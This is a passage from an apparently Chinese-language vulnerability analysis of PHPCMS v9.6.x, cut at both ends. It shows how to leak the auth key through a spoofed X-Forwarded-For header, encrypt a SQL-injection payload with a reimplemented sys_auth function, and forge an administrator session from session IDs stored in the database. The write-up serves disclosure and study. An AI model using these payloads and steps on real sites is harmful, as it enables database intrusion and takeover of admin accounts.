        $authkey = md5($prefix.$pc_auth_key);
        echo $authkey;
        exit();
        return $authkey;
    }
方便测试，IP参数伪造为X-Forwarded-For: 123.59.214.3，输出了$authkey后直接exit了：
    e58cb4eb9cc211f7b0fc070d428438de
然后把phpcms关键的加解密函数sys_auth单独写到某个php文件里面：
sys_auth_key.php:
     0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
                return substr($result, 26);
            } else {
                return '';
            }
        } else {
            return $keyc.rtrim(strtr(base64_encode($result), '+/', '-_'), '=');
        }
    }
    $sql = $_GET['sql'];
    $key = $_GET['key'];
    echo sys_auth($sql,'ENCODE',$key);
    ?>
带入$authkey与sqli payload：
第一次加密：
    http://127.0.0.1/dashboard/sys_auth_key.php?sql=1%27%20and%20%28extractvalue%281%2Cconcat%280x7e%2C%28select%20user%28%29%29%2C0x7e%29%29%29%3B%23%5Ctokee&key=e58cb4eb9cc211f7b0fc070d428438de
第二次加密：
    http://127.0.0.1/dashboard/sys_auth_key.php?sql=b5a4XCOdNpHwEb7nT4CUVMjUkE_cO9B7umiy5--PEK9R094s0L-dvb0HVCB5RUf1SlGkbDbu7HS6lL0mgrx8CGHWjG3m01zuIiyM5dbJ6D0lXZoZZvjOpIXlwTx_30M&key=exbsh7iuTSQsEcwLBcnB
    5cb5c0FCT6xz4xz7T1WONsQUFmoD3r0s8EkbTGyKIcnGDJsFO8g8fqAsJLu7_FuzHdJSsyxf7RL1jzO0Lvpq_3bzvfxOB6RRNEr938TYOwW3-QrF4JevCrf8taCsSuwK1FN6hwWf2s1AQDoXc2RL6SlZ-YwM3msW7vafcw5Vmxq7cPp3NSap1SV7l5h8gdGbm0HxiI_AmC4OTrFf
然后带入到auth中里面去访问member接口：
**伪造session进入后台**
众所周知，通过sql注入得到的phpcms的管理员密码是无法破解出来的，具体加密啊算法：
/phpcms/libs/functions/global.func.php LINE 1248
    /**
    * 对用户的密码进行加密
    * @param $password
    * @param $encrypt //传入加密串，在修改密码时做认证
    * @return array/password
    */
    function password($password, $encrypt='') {
        $pwd = array();
        $pwd['encrypt'] =  $encrypt ? $encrypt : create_randomstr();
        $pwd['password'] = md5(md5(trim($password)).$pwd['encrypt']);
        return $encrypt ? $pwd['password'] : $pwd;
    }
简单来说就是把明文密码做md5加密再连接上encrypt值（encrypt是创建用户的时候随机分配的字符串），再做一次md5加密，这样就很难解密了。
然而phpcms一直存在一处问题就是管理员登陆后台会将服务端的session值保存在数据库中，通过注入可以获取到session值来伪造访问后台页面，具体配置在system.php中：
     '/phpcmsv961/',
    //Session配置
    'session_storage' => 'mysql',
    'session_ttl' => 1800,
    'session_savepath' => CACHE_PATH.'sessions/',
    'session_n' => 0,
    //Cookie配置
    'cookie_domain' => '', //Cookie 作用域
    'cookie_path' => '', //Cookie 作用路径
    'cookie_pre' => 'qErKa_', //Cookie 前缀，同一域名下安装多套系统时，请修改Cookie前缀
    'cookie_ttl' => 0, //Cookie 生命周期，0 表示随浏览器进程
mysql存储方式，session有效期为30分钟。
/phpcms/libs/classes/session_mysql.class.php
    /** 
    * 删除指定的session_id
    * 
    * @param $id session
    * @return bool
    */
        public function destroy($id) {
            return $this->db->delete(array('sessionid'=>$id));
        }
    /**
    * 删除过期的 session
    * 
    * @param $maxlifetime 存活期时间
    * @return bool
    */
       public function gc($maxlifetime) {
            $expiretime = SYS_TIME - $maxlifetime;
            return $this->db->delete("`lastvisit`
**gbk:**
**传送门**
* * *
**[【漏洞分析】PHPCMS V9.6.1
任意文件读取漏洞分析（含PoC，已有补丁）](http://bobao.360.cn/learning/detail/3805.html)**